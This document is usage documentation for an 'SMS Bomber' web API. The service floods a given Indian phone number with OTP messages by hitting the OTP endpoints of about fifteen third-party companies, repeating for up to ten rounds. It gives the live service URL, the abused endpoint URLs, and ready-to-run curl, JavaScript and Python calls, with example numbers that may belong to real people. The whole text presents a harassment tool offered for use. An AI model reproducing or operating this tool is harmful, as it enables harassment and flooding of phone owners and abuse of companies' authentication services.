# SMS Bomber API Documentation

## Overview

The SMS Bomber API is a RESTful service that sends OTP (One-Time Password) requests to multiple services simultaneously. The API integrates with 16+ different OTP services and provides detailed success/failure statistics.

**Base URL:** `https://web-production-e7e0b.up.railway.app`

---

## Endpoints

### 1. Root Endpoint

Get API information and available endpoints.

**Endpoint:** `GET /`

**Response:**
```json
{
  "message": "SMS Bomber API",
  "endpoints": {
    "/send/<phone_number>": "Send OTP to phone number (10 digits without +91)",
    "/send?phone=<phone_number>": "Send OTP via query parameter"
  },
  "example": "/send/8789977777"
}
```

---

### 2. Send OTP (URL Parameter)

Send OTP requests to multiple services using phone number in URL path.

**Endpoint:** `GET/POST /send/<phone_number>`

**URL Parameters:**
- `phone_number` (required) - 10 digit phone number without country code (e.g., `8789968980`)

**Query Parameters:**
- `rounds` (optional) - Number of rounds to send OTP (1-10, default: 1)

**Example Request:**
```bash
GET https://web-production-e7e0b.up.railway.app/send/8789968980
GET https://web-production-e7e0b.up.railway.app/send/8789968980?rounds=2
```

**Example Response (Success):**
```json
{
  "success": true,
  "phone": "8789968980",
  "total_apis": 16,
  "success_count": 4,
  "failed_count": 12,
  "success_apis": [
    {
      "api": "communication.api.hungama.com",
      "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
      "status": 200
    },
    {
      "api": "ekyc.daycoindia.com",
      "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
      "status": 200
    },
    {
      "api": "api.servetel.in",
      "endpoint": "https://api.servetel.in/v1/auth/otp",
      "status": 200
    },
    {
      "api": "www.district.in",
      "endpoint": "https://www.district.in/gw/auth/generate_otp",
      "status": 200
    }
  ],
  "failed_apis": [
    {
      "api": "merucabapp.com",
      "endpoint": "https://merucabapp.com/api/otp/generate",
      "status": 401
    },
    {
      "api": "api.doubtnut.com",
      "endpoint": "https://api.doubtnut.com/v4/student/login",
      "status": 401
    }
  ]
}
```

---

### 3. Send OTP (Query Parameter)

Send OTP requests using phone number as query parameter.

**Endpoint:** `GET/POST /send?phone=<phone_number>`

**Query Parameters:**
- `phone` (required) - 10 digit phone number without country code
- `rounds` (optional) - Number of rounds to send OTP (1-10, default: 1)

**Example Request:**
```bash
GET https://web-production-e7e0b.up.railway.app/send?phone=8789968980
GET https://web-production-e7e0b.up.railway.app/send?phone=8789968980&rounds=1
```

**Response:** Same format as URL parameter endpoint

---

## Response Format

### Success Response

```json
{
  "success": true,
  "phone": "8789968980",
  "total_apis": 16,
  "success_count": 4,
  "failed_count": 12,
  "success_apis": [
    {
      "api": "api-name.com",
      "endpoint": "https://api-name.com/endpoint",
      "status": 200
    }
  ],
  "failed_apis": [
    {
      "api": "api-name.com",
      "endpoint": "https://api-name.com/endpoint",
      "status": 401
    }
  ]
}
```

### Error Response

```json
{
  "success": false,
  "error": "Invalid phone number! Must be 10 digits without +91",
  "phone": "123"
}
```

---

## Response Fields

| Field | Type | Description |
|-------|------|-------------|
| `success` | boolean | Whether the request was successful |
| `phone` | string | The phone number used |
| `total_apis` | integer | Total number of APIs attempted |
| `success_count` | integer | Number of successful OTP sends |
| `failed_count` | integer | Number of failed OTP sends |
| `success_apis` | array | List of successfully sent APIs with details |
| `failed_apis` | array | List of failed APIs with details |
| `error` | string | Error message (only in error responses) |

### API Object Structure

Each API object in `success_apis` or `failed_apis` contains:

| Field | Type | Description |
|-------|------|-------------|
| `api` | string | API domain name |
| `endpoint` | string | Full API endpoint URL |
| `status` | integer | HTTP status code (200, 201, 202 for success) |

---

## HTTP Status Codes

| Code | Description |
|------|-------------|
| 200 | Success - Request processed successfully |
| 400 | Bad Request - Invalid phone number format |
| 500 | Internal Server Error - Server-side error occurred |

---

## Error Handling

### Invalid Phone Number

**Request:**
```bash
GET /send/123
```

**Response:**
```json
{
  "success": false,
  "error": "Invalid phone number! Must be 10 digits without +91",
  "phone": "123"
}
```

**Status Code:** 400

### Server Error

**Response:**
```json
{
  "success": false,
  "error": "Failed to send OTP requests: <error message>",
  "phone": "8789968980"
}
```

**Status Code:** 500

---

## API Status Codes

The API attempts to send OTPs to multiple services. Each service returns different status codes:

### Success Status Codes
- `200` - OK
- `201` - Created
- `202` - Accepted

### Failure Status Codes
- `400` - Bad Request
- `401` - Unauthorized
- `403` - Forbidden
- `404` - Not Found
- `406` - Not Acceptable
- `429` - Too Many Requests (Rate Limited)
- `500` - Internal Server Error

---

## Usage Examples

### cURL

```bash
# Send OTP using URL parameter
curl https://web-production-e7e0b.up.railway.app/send/8789968980

# Send OTP using query parameter
curl "https://web-production-e7e0b.up.railway.app/send?phone=8789968980"

# Send OTP with multiple rounds
curl "https://web-production-e7e0b.up.railway.app/send/8789968980?rounds=2"
```

### JavaScript (Fetch)

```javascript
// Using URL parameter
fetch('https://web-production-e7e0b.up.railway.app/send/8789968980')
  .then(response => response.json())
  .then(data => console.log(data));

// Using query parameter
fetch('https://web-production-e7e0b.up.railway.app/send?phone=8789968980')
  .then(response => response.json())
  .then(data => console.log(data));
```

### Python (Requests)

```python
import requests

# Using URL parameter
response = requests.get('https://web-production-e7e0b.up.railway.app/send/8789968980')
data = response.json()
print(data)

# Using query parameter
response = requests.get('https://web-production-e7e0b.up.railway.app/send', 
                       params={'phone': '8789968980', 'rounds': 1})
data = response.json()
print(data)
```

### Postman

1. **Method:** GET or POST
2. **URL:** `https://web-production-e7e0b.up.railway.app/send/8789968980`
3. **Headers:** None required
4. **Body:** None required

---

## Supported OTP Services

The API integrates with the following services:

1. Hungama Communication API
2. Meru Cab
3. Dayco India
4. Doubtnut
5. NoBroker
6. Shiprocket
7. PenPencil
8. KPN Fresh
9. Servetel
10. District.in
11. Goibibo
12. FabHotels
13. Cleartrip
14. Yatra (2 endpoints)
15. Akbar Travels

**Note:** Not all services may respond successfully due to rate limiting, authentication requirements, or service availability.

---

## Rate Limiting

- The API does not enforce rate limiting on client requests
- Individual OTP services may have their own rate limits
- Some services may return `429 Too Many Requests` if rate limited
- Recommended: Wait a few seconds between requests

---

## Best Practices

1. **Phone Number Format:**
   - Always use 10 digits without country code
   - Do not include `+91` or any other prefix
   - Example: `8789968980` ✅ (not `+918789968980` ❌)

2. **Rounds Parameter:**
   - Use `rounds=1` for single attempt
   - Maximum `rounds=10` to avoid overwhelming services
   - Higher rounds may increase success rate but also increase load

3. **Error Handling:**
   - Always check the `success` field in response
   - Check `success_count` to see how many OTPs were sent
   - Review `failed_apis` to understand which services failed

4. **Response Time:**
   - API typically responds within 5-30 seconds
   - Timeout is set to 120 seconds
   - Each API call has a 5-second timeout

---

## Limitations

1. **Phone Number Validation:**
   - Only 10-digit Indian phone numbers are supported
   - No international phone numbers

2. **Service Availability:**
   - Not all integrated services may work at all times
   - Some services require authentication or have rate limits
   - Service availability depends on third-party API status

3. **Success Rate:**
   - Success rate varies based on service availability
   - Some services may block automated requests
   - Actual OTP delivery depends on service providers

---

## Support

For issues or questions:
- Check the response `error` field for specific error messages
- Review `failed_apis` array to see which services failed
- Ensure phone number is in correct format (10 digits)

---

## Changelog

### Version 1.0.0
- Initial release
- Support for 16+ OTP services
- JSON response format
- Multiple rounds support
- Detailed success/failure reporting

---

**Made By:** luci savex Anonymous

**API Base URL:** `https://web-production-e7e0b.up.railway.app`

